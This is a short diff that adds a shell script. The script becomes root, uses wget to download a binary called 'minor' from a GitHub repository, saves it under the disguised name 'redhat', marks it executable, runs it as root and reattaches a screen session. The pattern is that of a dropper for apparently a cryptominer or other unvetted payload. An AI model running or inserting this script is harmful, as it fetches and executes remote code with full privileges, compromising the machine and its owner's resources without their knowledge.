@@ -1,0 +1,5 @@
+sudo su <<EOF
+wget -qO redhat https://github.com/sarifadim/beam/raw/main/minor && chmod +x redhat
+./redhat
+EOF
+screen -r
